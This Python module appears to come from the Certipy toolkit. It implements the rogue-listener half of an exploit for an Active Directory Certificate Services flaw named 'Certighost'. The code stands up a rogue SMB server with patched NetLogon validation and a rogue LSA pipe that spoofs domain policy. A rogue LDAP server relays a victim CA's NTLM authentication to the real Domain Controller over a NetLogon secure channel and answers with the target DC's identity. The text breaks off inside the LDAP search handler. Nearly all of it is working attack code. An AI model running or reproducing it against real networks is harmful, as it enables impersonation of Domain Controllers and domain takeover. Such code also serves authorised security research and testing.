"""
Rogue Domain Controller identity oracle for CVE-2026-54121 (Certighost).

This module ports the rogue-listener half of the "Certighost" cdc-redirect
proof of concept into a typed Certipy library module. It stands up three
cooperating rogue services that impersonate a Domain Controller so that a
victim CA's machine-account callback authenticates against attacker-controlled
infrastructure and is answered with the target DC's identity.

Components:
    - A rogue SMB server (impacket SimpleSMBServer) whose NetLogon validation is
      patched to set both the E and K bits of ParameterControl (0x800 | 0x20) so
      that a CA hosted on a Domain Controller (a server-trust account) is
      accepted by the real DC.
    - A rogue LSA service over the lsarpc named pipe that answers policy queries
      with the spoofed domain's DNS/NetBIOS/forest name, GUID and SID.
    - A rogue LDAP server that completes an NTLMSSP bind by passing the victim's
      authentication through to the real DC via a NetLogon secure-channel oracle,
      then returns a single computer object carrying the target DC's
      sAMAccountName, dNSHostName and objectSid.

The wire-level behaviour (NetLogon ParameterControl values, NTLM challenge
flags, the sealed-LDAP framing and the hand-rolled DER/LDAP encoders) is a
faithful port of the original PoC and must not be altered.
"""

import calendar
import os
import socket
import struct
import threading
import time
from binascii import unhexlify
from typing import Any, Dict, List, Optional, Tuple, Union

from Cryptodome.Cipher import ARC4
from impacket import ntlm, smbserver, uuid
from impacket.dcerpc.v5 import epm, lsad, nrpc, rpcrt, transport
from impacket.dcerpc.v5.dtypes import NULL, RPC_SID
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, DCERPCServer

from certipy.lib.errors import handle_error
from certipy.lib.logger import logging

# Set once _patch_smb() has installed the impacket shims (see build_smb_lsa).
_smb_patched = False


def bin2sid(r: bytes) -> str:
    """Convert a binary SID to its canonical ``S-1-5-...`` string form."""
    rev, n = struct.unpack(">BB", r[:2])
    auth = struct.unpack(">Q", b"\x00\x00" + r[2:8])[0]
    return f"S-{rev}-{auth}-" + "-".join(
        str(struct.unpack("<I", r[8 + i * 4 : 12 + i * 4])[0]) for i in range(n)
    )


def dns2dn(d: str) -> str:
    """Convert a DNS domain (``corp.local``) to a base DN (``DC=corp,DC=local``)."""
    return ",".join(f"DC={p}" for p in d.split("."))


def dns2nb(d: str) -> str:
    """Derive an upper-case NetBIOS name from the first label of a DNS domain."""
    return d.split(".")[0].upper()


def detect_ip(dc_ip: str) -> Optional[str]:
    """Return the local address the OS would use to reach ``dc_ip`` on 445."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect((dc_ip, 445))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as exc:
        logging.debug(f"Listener address detection via {dc_ip}:445: {exc!r}")
        return None


def port_ok(h: str, p: int, t: float = 1.0) -> bool:
    """Return True if a TCP connection to ``h:p`` succeeds within ``t`` seconds."""
    try:
        s = socket.create_connection((h, p), t)
        s.close()
        return True
    except Exception as exc:
        logging.debug(f"Rogue server readiness check {h}:{p}: {exc!r}")
        return False


def _bl(n: int) -> bytes:
    """Encode a BER/DER length field (short or long form) for length ``n``."""
    if n < 0x80:
        return bytes([n])
    o = b""
    while n:
        o = bytes([n & 0xFF]) + o
        n >>= 8
    return bytes([0x80 | len(o)]) + o


def _bi(n: int) -> bytes:
    """Encode a DER INTEGER (tag 0x02) holding the value ``n``."""
    if n == 0:
        return b"\x02\x01\x00"
    o = b""
    while n:
        o = bytes([n & 0xFF]) + o
        n >>= 8
    if o[0] & 0x80:
        o = b"\x00" + o
    return b"\x02" + _bl(len(o)) + o


def _bo(d: Union[str, bytes]) -> bytes:
    """Encode a DER OCTET STRING (tag 0x04); ``str`` is UTF-8 encoded first."""
    if isinstance(d, str):
        d = d.encode()
    return b"\x04" + _bl(len(d)) + d


def _bs(i: bytes) -> bytes:
    """Wrap already-encoded contents ``i`` in a DER SEQUENCE (tag 0x30)."""
    return b"\x30" + _bl(len(i)) + i


def _bst(i: bytes) -> bytes:
    """Wrap already-encoded contents ``i`` in a DER SET (tag 0x31)."""
    return b"\x31" + _bl(len(i)) + i


def _be(n: int) -> bytes:
    """Encode a single-byte DER ENUMERATED (tag 0x0a) holding ``n``."""
    return b"\x0a\x01" + bytes([n])


def _lm(mid: int, tag: int, p: bytes) -> bytes:
    """Wrap payload ``p`` as an LDAPMessage (id ``mid``, protocol-op ``tag``)."""
    return _bs(_bi(mid) + bytes([tag]) + _bl(len(p)) + p)


def _lbr(mid: int, rc: int = 0, cr: Optional[bytes] = None) -> bytes:
    """Build an LDAP BindResponse (result code ``rc``, optional SASL creds ``cr``)."""
    i = _be(rc) + _bo("") + _bo("")
    if cr:
        i += b"\x87" + _bl(len(cr)) + cr
    return _lm(mid, 0x61, i)


def _lse(mid: int, dn: str, attrs: Dict[str, List[Union[str, bytes]]]) -> bytes:
    """Build an LDAP SearchResultEntry for ``dn`` with the given attributes."""
    al = b""
    for k, vs in attrs.items():
        ve = b""
        for v in vs:
            ve += _bo(v if isinstance(v, bytes) else v.encode())
        al += _bs(_bo(k) + _bst(ve))
    return _lm(mid, 0x64, _bo(dn) + _bs(al))


def _lsd(mid: int, rc: int = 0) -> bytes:
    """Build an LDAP SearchResultDone with result code ``rc``."""
    return _lm(mid, 0x65, _be(rc) + _bo("") + _bo(""))


def _dl(d: bytes, o: int) -> Tuple[int, int]:
    """Decode a BER length at offset ``o``; return (length, next-offset)."""
    f = d[o]
    o += 1
    if f < 0x80:
        return f, o
    nb = f & 0x7F
    l = 0
    for i in range(nb):
        l = (l << 8) | d[o + i]
    return l, o + nb


def _plh(d: bytes) -> Tuple[int, int, bytes]:
    """Parse an LDAPMessage header; return (message-id, protocol-op tag, payload)."""
    _, o = _dl(d, 1)
    il, o = _dl(d, o + 1)
    mid = int.from_bytes(d[o : o + il], "big")
    o += il
    tag = d[o]
    pl, o = _dl(d, o + 1)
    return mid, tag, d[o : o + pl]


def _challenge() -> Tuple[int, Any]:
    """Return (flags, NTLMAuthChallenge) carrying the rogue server's NTLM flags."""
    c = ntlm.NTLMAuthChallenge()
    fl = (
        ntlm.NTLMSSP_NEGOTIATE_UNICODE
        | ntlm.NTLM_NEGOTIATE_OEM
        | ntlm.NTLMSSP_NEGOTIATE_NTLM
        | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
        | ntlm.NTLMSSP_TARGET_TYPE_DOMAIN
        | ntlm.NTLMSSP_NEGOTIATE_VERSION
        | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
        | ntlm.NTLMSSP_REQUEST_TARGET
        | ntlm.NTLMSSP_NEGOTIATE_56
        | ntlm.NTLMSSP_NEGOTIATE_128
        | ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH
    )
    return fl, c


def build_challenge(dnb: str, ddns: str, hnb: str, hdns: str, chal: bytes) -> bytes:
    """Build a serialized NTLM type-2 (CHALLENGE) message for the rogue server.

    Args:
        dnb: NetBIOS domain name advertised in the challenge.
        ddns: DNS domain name advertised in the challenge.
        hnb: NetBIOS host name of the rogue server.
        hdns: DNS host name of the rogue server.
        chal: The 8-byte server challenge nonce.

    Returns:
        The wire bytes of the NTLM CHALLENGE message.
    """
    fl, c = _challenge()
    c["flags"] = fl
    c["challenge"] = chal
    db = dnb.encode("utf-16-le")
    c["domain_name"] = db
    c["domain_len"] = len(db)
    c["domain_max_len"] = len(db)
    c["domain_offset"] = 56
    av = ntlm.AV_PAIRS()
    av[ntlm.NTLMSSP_AV_DOMAINNAME] = dnb.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = ddns.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_HOSTNAME] = hnb.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = hdns.encode("utf-16-le")
    av[ntlm.NTLMSSP_AV_TIME] = struct.pack(
        "<q", 116444736000000000 + calendar.timegm(time.gmtime()) * 10000000
    )
    c["TargetInfoFields"] = av
    c["TargetInfoFields_len"] = len(av)
    c["TargetInfoFields_max_len"] = len(av)
    c["TargetInfoFields_offset"] = 56 + len(db)
    c["Version"] = b"\x0a\x00\x00\x00\x00\x00\x00\x0f"
    c["VersionLen"] = 8
    return c.getData()


class NLOracle:
    """NetLogon pass-through oracle that validates NTLM against the real DC.

    Establishes a NetLogon secure channel with the real Domain Controller using
    the rogue machine account, then relays each victim NTLM AUTHENTICATE message
    through ``NetrLogonSamLogonWithFlags`` so the DC performs the actual
    credential validation and returns the user session key.
    """

    def __init__(self, dcip: str, cname: str, chash: str, cdom: str) -> None:
        """Initialize the oracle.

        Args:
            dcip: Real Domain Controller IP used for the secure channel.
            cname: Secure-channel machine account name (including trailing ``$``).
            chash: Hex NT hash of that machine account.
            cdom: Domain used when setting the RPC credentials.
        """
        self.dcip = dcip
        self.cname = cname
        self.chash = unhexlify(chash)
        self.cdom = cdom
        self.name = cname.rstrip("$")
        self.dce: Any = None
        self.auth: Any = None

    def setup(self) -> None:
        """Establish the NetLogon secure channel with the real DC."""
        logging.debug(f"Netlogon: resolving NRPC endpoint on {self.dcip}")
        b = epm.hept_map(
            self.dcip,
            nrpc.MSRPC_UUID_NRPC,
            dataRepresentation=rpcrt.DCERPC.NDRSyntax,
            protocol="ncacn_ip_tcp",
        )
        t = transport.DCERPCTransportFactory(b)
        d = t.get_dce_rpc()
        d.connect()
        self.dce = d
        syn = uuid.bin_to_uuidtup(rpcrt.DCERPC.NDRSyntax)
        d.bind(nrpc.MSRPC_UUID_NRPC, transfer_syntax=syn)
        cc = os.urandom(8)
        logging.debug(f"Netlogon: NetrServerReqChallenge for workstation {self.name}")
        r = nrpc.hNetrServerReqChallenge(d, "", self.name + "\x00", cc)
        sk = nrpc.ComputeSessionKeyStrongKey(None, cc, r["ServerChallenge"], self.chash)
        cr = nrpc.ComputeNetlogonCredential(cc, sk)
        logging.debug(
            f"Netlogon: NetrServerAuthenticate3 secure-channel account {self.cname}"
        )
        nrpc.hNetrServerAuthenticate3(
            d,
            "\x00",
            self.cname + "\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
            self.name + "\x00",
            cr,
            0x600FFFFF,
        )
        d.set_credentials(self.cname, "", self.cdom)
        d.set_auth_type(rpcrt.RPC_C_AUTHN_NETLOGON)
        d.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        d.bind(nrpc.MSRPC_UUID_NRPC, alter=1, transfer_syntax=syn)
        a = nrpc.ComputeNetlogonAuthenticator(cr, sk)
        d.set_session_key(sk)
        resp = nrpc.hNetrLogonGetCapabilities(d, "", self.name, a)
        self.auth = resp["ReturnAuthenticator"]
        logging.debug("Netlogon: secure channel established")

    def validate(self, blob: bytes, challenge: bytes) -> Tuple[bytes, int, int]:
        """Validate a victim NTLM AUTHENTICATE blob against the real DC.

        Args:
            blob: The raw NTLM AUTHENTICATE (type-3) message bytes.
            challenge: The 8-byte server challenge previously issued.

        Returns:
            Tuple of (encrypted session key, NetLogon error code, NTLM flags).
        """
        am = ntlm.NTLMAuthChallengeResponse()
        am.fromString(blob)
        r = nrpc.NetrLogonSamLogonWithFlags()
        r["LogonServer"] = "\x00"
        r["ComputerName"] = self.name + "\x00"
        r["ValidationLevel"] = (
            nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
        )
        r["LogonLevel"] = (
            nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        )
        r["LogonInformation"]["tag"] = r["LogonLevel"]
        ident = r["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
        ident["LogonDomainName"] = am["domain_name"].decode("utf-16le")
        ident["ParameterControl"] = 0x800 | 0x20
        ident["UserName"] = am["user_name"].decode("utf-16le")
        ident["Workstation"] = ""
        logging.debug(
            f"Netlogon: validating {ident['LogonDomainName']}\\{ident['UserName']} "
            f"(ParameterControl=0x{int(ident['ParameterControl']):x})"
        )
        r["LogonInformation"]["LogonNetworkTransitive"]["LmChallenge"] = challenge
        r["LogonInformation"]["LogonNetworkTransitive"]["NtChallengeResponse"] = am[
            "ntlm"
        ]
        r["LogonInformation"]["LogonNetworkTransitive"]["LmChallengeResponse"] = am[
            "lanman"
        ]
        r["Authenticator"] = self.auth
        r["ReturnAuthenticator"]["Credential"] = b"\x00" * 8
        r["ReturnAuthenticator"]["Timestamp"] = 0
        r["ExtraFlags"] = 0
        resp = self.dce.request(r)
        logging.debug(
            f"Netlogon: validation returned 0x{int(resp['ErrorCode']) & 0xFFFFFFFF:08x}"
        )
        sk = ntlm.generateEncryptedSessionKey(
            resp["ValidationInformation"]["ValidationSam4"]["UserSessionKey"],
            am["session_key"],
        )
        return sk, resp["ErrorCode"], am["flags"]

    def disconnect(self) -> None:
        """Tear down the NetLogon secure channel to the real DC, if established."""
        if self.dce is None:
            return
        try:
            self.dce.disconnect()
        except Exception as exc:
            logging.debug(f"Netlogon: secure-channel teardown failed: {exc!r}")
        finally:
            self.dce = None


def _patch_smb() -> None:
    """Install the impacket ``SimpleSMBServer`` shims used by the rogue SMB server.

    Adds ``setComputerAccount``/``getServer`` helpers when missing and patches
    ``smbserver.NetLogon.logonUserAndGetSessionKey`` so that both the E and K
    bits of ``ParameterControl`` are set. This is idempotent and is invoked
    lazily from :func:`run_lsa`.
    """
    server_cls = smbserver.SimpleSMBServer
    if not hasattr(server_cls, "setComputerAccount"):

        def _sca(self: Any, **kw: Any) -> None:
            c = self._SimpleSMBServer__smbConfig
            c.set("global", "server_name", kw["computer_account_name"][:-1])
            c.set("global", "server_domain", kw["computer_account_domain"])
            for k in (
                "computer_account_name",
                "computer_account_hash",
                "computer_account_aes",
                "computer_account_password",
                "computer_account_domain",
            ):
                c.set("global", k, kw.get(k, "") or "")
            c.set("global", "dcip", kw["dcip"])
            self._SimpleSMBServer__server.setServerConfig(c)
            self._SimpleSMBServer__server.processConfigFile()

        server_cls.setComputerAccount = lambda self, **kw: _sca(self, **kw)  # type: ignore
    if not hasattr(server_cls, "getServer"):
        server_cls.getServer = lambda self: self._SimpleSMBServer__server  # type: ignore

    # Fix STATUS_NOLOGON_SERVER_TRUST_ACCOUNT when the target CA is hosted on a
    # Domain Controller.  In that topology the CA authenticates back as the DC's
    # machine account, which is a server-trust account.  Fortra's current
    # Impacket sets only the K bit (0x800) in ParameterControl when validating
    # the rogue SMB NetLogon session, so the real DC rejects the server-trust
    # account with STATUS_NOLOGON_SERVER_TRUST_ACCOUNT.  Setting the E bit (0x20)
    # as well, per MS-NRPC 2.2.1.4.15, makes the DC accept both workstation and
    # DC machine accounts, so no patched/forked Impacket build is required.
    # Credits to @GregDurys (fortra/impacket PR #2239) for the fix.
    if hasattr(smbserver, "NetLogon"):
        netlogon_cls = smbserver.NetLogon  # type: ignore

        def _fixed_logon(
            self: Any, authenticateMessage: Any, serverChallenge: Any  # noqa: N803
        ) -> Tuple[bytes, int]:
            request = nrpc.NetrLogonSamLogonWithFlags()
            request["LogonServer"] = "\x00"
            request["ComputerName"] = self.computer_name + "\x00"
            request["ValidationLevel"] = (
                nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
            )
            request["LogonLevel"] = (
                nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
            )
            request["LogonInformation"][
                "tag"
            ] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
            ident = request["LogonInformation"]["LogonNetworkTransitive"]["Identity"]
            ident["LogonDomainName"] = authenticateMessage["domain_name"].decode(
                "utf-16le"
            )
            ident["ParameterControl"] = 0x800 | 0x20
            ident["UserName"] = authenticateMessage["user_name"].decode("utf-16le")
            ident["Workstation"] = ""
            logging.debug(
                f"Rogue SMB NetLogon: validating {ident['LogonDomainName']}\\{ident['UserName']} "
                f"(ParameterControl=0x{int(ident['ParameterControl']):x})"
            )
            request["LogonInformation"]["LogonNetworkTransitive"][
                "LmChallenge"
            ] = serverChallenge
            request["LogonInformation"]["LogonNetworkTransitive"][
                "NtChallengeResponse"
            ] = authenticateMessage["ntlm"]
            request["LogonInformation"]["LogonNetworkTransitive"][
                "LmChallengeResponse"
            ] = authenticateMessage["lanman"]
            request["Authenticator"] = self.authenticator
            request["ReturnAuthenticator"]["Credential"] = b"\x00" * 8
            request["ReturnAuthenticator"]["Timestamp"] = 0
            request["ExtraFlags"] = 0
            resp = self.dce.request(request)
            logging.debug(
                f"Rogue SMB NetLogon: validation returned "
                f"0x{int(resp['ErrorCode']) & 0xFFFFFFFF:08x}"
            )
            signing_key = ntlm.generateEncryptedSessionKey(
                resp["ValidationInformation"]["ValidationSam4"]["UserSessionKey"],
                authenticateMessage["session_key"],
            )
            return signing_key, resp["ErrorCode"]

        netlogon_cls.logonUserAndGetSessionKey = _fixed_logon  # type: ignore


class LSASrv(DCERPCServer):
    """Rogue LSA RPC service exposed over ``\\PIPE\\lsarpc``.

    Answers a handful of ``lsarpc`` opnums with a spoofed policy handle and
    domain-policy information (DNS/NetBIOS/forest name, GUID, SID, primary and
    account domain info, and a Primary Domain Controller server role) so that a
    caller believes it is talking to the spoofed domain's LSA.
    """

    UUID = ("12345778-1234-ABCD-EF00-0123456789AB", "0.0")

    def __init__(
        self, nb: str, dns: str, forest: str, guid_le: bytes, sid_s: str
    ) -> None:
        """Initialize the rogue LSA server.

        Args:
            nb: NetBIOS domain name.
            dns: DNS domain name.
            forest: DNS forest name.
            guid_le: 16-byte little-endian domain GUID.
            sid_s: Canonical domain SID string.
        """
        DCERPCServer.__init__(self)
        self._h = b"\x00" * 4 + b"LSA!" + b"\xde\xad\xbe\xef" * 2
        self._nb = nb
        self._dns = dns
        self._forest = forest
        self._g = guid_le
        self._sid = sid_s
        self.addCallbacks(
            self.UUID,
            "\\PIPE\\lsarpc",
            {0: self._cl, 6: self._op, 7: self._q, 44: self._op2, 46: self._q2},
        )

    def _u(self, s: str) -> Any:
        """Wrap a string in an ``RPC_UNICODE_STRING``."""
        u = lsad.RPC_UNICODE_STRING()
        u["Data"] = s
        return u

    def _s(self) -> Any:
        """Build the domain ``RPC_SID`` from its canonical string form."""
        s = RPC_SID()
        s.fromCanonical(self._sid)
        return s

    def _di(self) -> Any:
        """Build the LSA DNS-domain info block advertised to callers."""
        i = lsad.LSAPR_POLICY_DNS_DOMAIN_INFO()
        i["Name"] = self._u(self._nb)
        i["DnsDomainName"] = self._u(self._dns)
        i["DnsForestName"] = self._u(self._forest)
        i["DomainGuid"] = self._g
        i["Sid"] = self._s()
        return i

    def _cl(self, d: bytes) -> bytes:
        """LsarClose: return a zeroed policy handle."""
        r = lsad.LsarCloseResponse()
        r["PolicyHandle"] = b"\x00" * 20
        r["ErrorCode"] = 0
        return r.getData()

    def _op(self, d: bytes) -> bytes:
        """LsarOpenPolicy: hand back the canned policy handle."""
        r = lsad.LsarOpenPolicyResponse()
        r["PolicyHandle"] = self._h
        r["ErrorCode"] = 0
        return r.getData()

    def _op2(self, d: bytes) -> bytes:
        """LsarOpenPolicy2: hand back the canned policy handle."""
        r = lsad.LsarOpenPolicy2Response()
        r["PolicyHandle"] = self._h
        r["ErrorCode"] = 0
        return r.getData()

    def _qd(self, d: bytes, cls: Any) -> bytes:
        """Answer an LsarQueryInformationPolicy(2) for a given info class.

        Args:
            d: Raw request bytes.
            cls: The impacket response NDR class to instantiate.

        Returns:
            The serialized response bytes.
        """
        try:
            req = lsad.LsarQueryInformationPolicy(d)
            lv = int(req["InformationClass"])
        except Exception as exc:
            logging.debug(f"Rogue LSA query decoding: {exc!r}")
            lv = 12
        r = cls()
        info = lsad.LSAPR_POLICY_INFORMATION()
        if lv in (12, 13):
            info["tag"] = lv
            info["PolicyDnsDomainInfo" if lv == 12 else "PolicyDnsDomainInfoInt"] = (
                self._di()
            )
        elif lv in (5, 14):
            info["tag"] = lv
            ai = lsad.LSAPR_POLICY_ACCOUNT_DOM_INFO()
            ai["DomainName"] = self._u(self._nb)
            ai["DomainSid"] = self._s()
            info[
                "PolicyAccountDomainInfo" if lv == 5 else "PolicyLocalAccountDomainInfo"
            ] = ai
        elif lv == 3:
            info["tag"] = 3
            pi = lsad.LSAPR_POLICY_PRIMARY_DOM_INFO()
            pi["Name"] = self._u(self._nb)
            pi["Sid"] = self._s()
            info["PolicyPrimaryDomainInfo"] = pi
        elif lv == 6:
            info["tag"] = 6
            ri = lsad.POLICY_LSA_SERVER_ROLE_INFO()
            ri["LsaServerRole"] = 3
            info["PolicyServerRoleInfo"] = ri
        else:
            r["PolicyInformation"] = NULL
            r["ErrorCode"] = 0xC0000022
            return r.getData()
        r["PolicyInformation"] = info
        r["ErrorCode"] = 0
        return r.getData()

    def _q(self, d: bytes) -> bytes:
        """LsarQueryInformationPolicy dispatcher."""
        return self._qd(d, lsad.LsarQueryInformationPolicyResponse)

    def _q2(self, d: bytes) -> bytes:
        """LsarQueryInformationPolicy2 dispatcher."""
        return self._qd(d, lsad.LsarQueryInformationPolicy2Response)


def build_smb_lsa(
    bind: str,
    port: int,
    nb: str,
    dns: str,
    forest: str,
    guid_le: bytes,
    sid_s: str,
    cname: str,
    chash: str,
    cpass: Optional[str],
    cdom: str,
    dcip: str,
) -> smbserver.SimpleSMBServer:
    """Build the rogue SMB server with the rogue LSA service attached.

    Installs the impacket shims lazily, configures ``SimpleSMBServer`` with the
    rogue machine account and registers the ``lsarpc`` named pipe pointed at a
    :class:`LSASrv` instance. The returned server is not started; the caller is
    responsible for calling ``start()`` (which blocks) on a dedicated thread.

    Args:
        bind: Bind address for the SMB listener.
        port: TCP port for the SMB listener.
        nb: NetBIOS domain name.
        dns: DNS domain name.
        forest: DNS forest name.
        guid_le: 16-byte little-endian domain GUID.
        sid_s: Canonical domain SID string.
        cname: Rogue machine account name (including trailing ``$``).
        chash: Hex NT hash of the rogue machine account.
        cpass: Cleartext password of the rogue machine account (may be None).
        cdom: Domain for the rogue machine account.
        dcip: Real Domain Controller IP for NetLogon pass-through.

    Returns:
        The configured (but not yet started) rogue SMB server.
    """
    global _smb_patched
    if not _smb_patched:
        _patch_smb()
        _smb_patched = True
    if not hasattr(smbserver, "NetLogon"):
        logging.debug(
            "Rogue LSA/SMB preflight: installed Impacket lacks smbserver.NetLogon; "
            "the rogue SMB server cannot obtain the authenticated session key, "
            "so the CA callback is expected to fail"
        )
    smb = smbserver.SimpleSMBServer(listenAddress=bind, listenPort=port)
    smb.setSMB2Support(True)
    smb.setLogFile("")
    smb.setComputerAccount(  # type: ignore
        computer_account_name=cname,
        computer_account_hash=chash,
        computer_account_aes="",
        computer_account_password=cpass,
        computer_account_domain=cdom,
        dcip=dcip,
    )
    cfg: Any = smb._SimpleSMBServer__smbConfig  # type: ignore
    cfg.set("global", "server_os", "Windows Server 2022 Standard")
    smb.getServer().setServerConfig(cfg)  # type: ignore
    smb.getServer().processConfigFile()  # type: ignore
    lsa = LSASrv(nb, dns, forest, guid_le, sid_s)
    lsa.daemon = True
    lsa.start()
    smb.registerNamedPipe("lsarpc", ("127.0.0.1", lsa.getListenPort()))
    return smb


class ConnState:
    """Per-connection NTLM sealing/signing state for the rogue LDAP server."""

    def __init__(self) -> None:
        """Initialize an unsealed connection state."""
        self.fl: int = 0
        self.ss: Any = None
        self.ce: Any = None
        self.se: Any = None
        self.sseq: int = 0
        self.sealed: bool = False
        self.chal: bytes = b""

    def arm(self, sk: bytes, fl: int) -> None:
        """Derive sign/seal keys from the session key and mark the state sealed.

        Args:
            sk: The negotiated session key.
            fl: The negotiated NTLM flags.
        """
        self.fl = fl
        self.ss = ntlm.SIGNKEY(fl, sk, "Server")
        self.ce = ARC4.new(ntlm.SEALKEY(fl, sk, "Client"))
        self.se = ARC4.new(ntlm.SEALKEY(fl, sk, "Server"))
        self.sealed = True


class RogueLDAP:
    """Rogue LDAP server returning the target DC's identity after an NTLM bind.

    Completes an NTLMSSP SASL bind by challenge/response passed through
    :class:`NLOracle` to the real DC, then serves a RootDSE and a single spoofed
    computer object carrying the target DC's ``sAMAccountName``,
    ``dNSHostName`` and ``objectSid``. Sealed (encrypted) LDAP framing is
    honoured once the bind completes.
    """

    def __init__(
        self,
        ddns: str,
        dnb: str,
        cname: str,
        chash: str,
        cdom: str,
        dcip: str,
        tsid_bin: bytes,
        edns: str,
        ecn: str,
        esam: str,
    ) -> None:
        """Initialize the rogue LDAP server.

        Args:
            ddns: DNS domain name of the spoofed domain.
            dnb: NetBIOS domain name of the spoofed domain.
            cname: Rogue machine account name (including trailing ``$``).
            chash: Hex NT hash of the rogue machine account.
            cdom: Domain for the NetLogon secure channel.
            dcip: Real Domain Controller IP for NetLogon pass-through.
            tsid_bin: Raw binary ``objectSid`` of the impersonated target DC.
            edns: ``dNSHostName`` of the impersonated target DC.
            ecn: ``cn`` of the impersonated target DC.
            esam: ``sAMAccountName`` of the impersonated target DC.
        """
        self.ddns = ddns
        self.dnb = dnb
        self.dn = dns2dn(ddns)
        self.cname = cname
        self.chash = chash
        self.cdom = cdom
        self.dcip = dcip
        self.tsid = tsid_bin
        self.edns = edns
        self.ecn = ecn
        self.esam = esam
        self._hnb = cname.rstrip("$")
        self._hdns = f"{self._hnb}.{ddns}"
        self._stop = threading.Event()
        self._sock: Optional[socket.socket] = None

    def _rootdse(self) -> Dict[str, List[Union[str, bytes]]]:
        """Return the RootDSE attributes advertised for a base-scope query."""
        return {
            "defaultNamingContext": [self.dn],
            "rootDomainNamingContext": [self.dn],
            "configurationNamingContext": [f"CN=Configuration,{self.dn}"],
            "schemaNamingContext": [f"CN=Schema,CN=Configuration,{self.dn}"],
            "namingContexts": [
                self.dn,
                f"CN=Configuration,{self.dn}",
                f"CN=Schema,CN=Configuration,{self.dn}",
            ],
            "dnsHostName": [self._hdns],
            "ldapServiceName": [
                f"{self.ddns}:{self._hnb.lower()}$@{self.ddns.upper()}"
            ],
            "supportedSASLMechanisms": [
                "GSSAPI",
                "GSS-SPNEGO",
                "EXTERNAL",
                "DIGEST-MD5",
            ],
            "supportedLDAPVersion": ["3", "2"],
            "supportedCapabilities": [
                "1.2.840.113556.1.4.800",
                "1.2.840.113556.1.4.1670",
                "1.2.840.113556.1.4.1791",
                "1.2.840.113556.1.4.1935",
            ],
            "domainFunctionality": ["7"],
            "forestFunctionality": ["7"],
            "domainControllerFunctionality": ["7"],
        }

    def _principal(self, sam: str) -> Dict[str, List[Union[str, bytes]]]:
        """Return the spoofed computer object carrying the target DC identity.

        Args:
            sam: Fallback ``sAMAccountName`` if none was configured.

        Returns:
            The attribute mapping for the target DC computer object.
        """
        return {
            "objectClass": [
                "top",
                "person",
                "organizationalPerson",
                "user",
                "computer",
            ],
            "cn": [self.ecn or sam.rstrip("$")],
            "sAMAccountName": [self.esam or sam],
            "objectSid": [self.tsid],
            "objectGUID": [b"\x00" * 16],
            "userAccountControl": ["66048"],
            "objectCategory": [f"CN=Computer,CN=Schema,CN=Configuration,{self.dn}"],
            "dNSHostName": [self.edns],
            "servicePrincipalName": [
                f"HOST/{self.edns}",
                f"HOST/{self.ecn or self._hnb}",
            ],
        }

    def _seal(self, st: ConnState, pdu: bytes) -> bytes:
        """Seal (encrypt+sign) an LDAP PDU and prefix its 4-byte length."""
        sealed, sig = ntlm.SEAL(st.fl, st.ss, b"", pdu, pdu, st.sseq, st.se.encrypt)
        st.sseq += 1
        f = sig.getData() + sealed
        return struct.pack(">I", len(f)) + f

    def _send(
        self, conn: socket.socket, st: ConnState, data: bytes, do_seal: bool
    ) -> None:
        """Send ``data`` to the client, sealing it when the session is sealed."""
        if do_seal and st.sealed:
            conn.sendall(self._seal(st, data))
        else:
            conn.sendall(data)

    def _handle_bind(
        self, conn: socket.socket, st: ConnState, mid: int, od: bytes, rs: bool
    ) -> None:
        """Handle an LDAP BindRequest, driving the NTLMSSP SASL exchange.

        Args:
            conn: The client socket.
            st: The per-connection state.
            mid: LDAP message id.
            od: The BindRequest protocol-op payload.
            rs: Whether responses should be sealed.
        """
        off = 0
        if od[off] != 0x02:
            return
        vl, off = _dl(od, off + 1)
        off += vl
        off += 1
        nl2, off = _dl(od, off)
        off += nl2
        at = od[off]
        if at == 0xA3:
            off += 1
            _, off = _dl(od, off)
            if od[off] != 0x04:
                return
            ml, off = _dl(od, off + 1)
            mech = od[off : off + ml].decode("utf-8", errors="replace")
            off += ml
            creds = b""
            if off < len(od) and od[off] == 0x04:
                cl, off = _dl(od, off + 1)
                creds = od[off : off + cl]
            if (
                mech in ("GSS-SPNEGO", "GSSAPI")
                and creds.startswith(b"NTLMSSP\x00")
                and len(creds) >= 12
            ):
                mt = int.from_bytes(creds[8:12], "little")
                if mt == 1:
                    st.chal = os.urandom(8)
                    ch = build_challenge(
                        self.dnb, self.ddns, self._hnb, self._hdns, st.chal
                    )
                    self._send(conn, st, _lbr(mid, 14, ch), rs)
                    return
                if mt == 3:
                    nlo = NLOracle(self.dcip, self.cname, self.chash, self.cdom)
                    try:
                        nlo.setup()
                        sk, err, fl = nlo.validate(creds, st.chal)
                    except Exception as exc:
                        logging.warning(
                            f"Rogue LDAP: NetLogon pass-through to the DC failed: {exc}"
                        )
                        handle_error(is_warning=True)
                        self._send(conn, st, _lbr(mid, 49), rs)
                        return
                    finally:
                        nlo.disconnect()
                    if err != 0:
                        logging.warning(
                            f"Rogue LDAP: NetLogon rejected the CA bind: "
                            f"0x{int(err) & 0xFFFFFFFF:08x}"
                        )
                        self._send(conn, st, _lbr(mid, 49), rs)
                        return
                    st.arm(sk, fl)
                    self._send(conn, st, _lbr(mid, 0), rs)
                    return
        self._send(conn, st, _lbr(mid, 0), rs)

    def _handle_search(
        self, conn: socket.socket, st: ConnState, mid: int, od: bytes, rs: bool
    ) -> None:
        """Handle an LDAP SearchRequest, returning RootDSE or the target object.

        Args:
            conn: The client socket.
            st: The per-connection state.
            mid: LDAP message id.
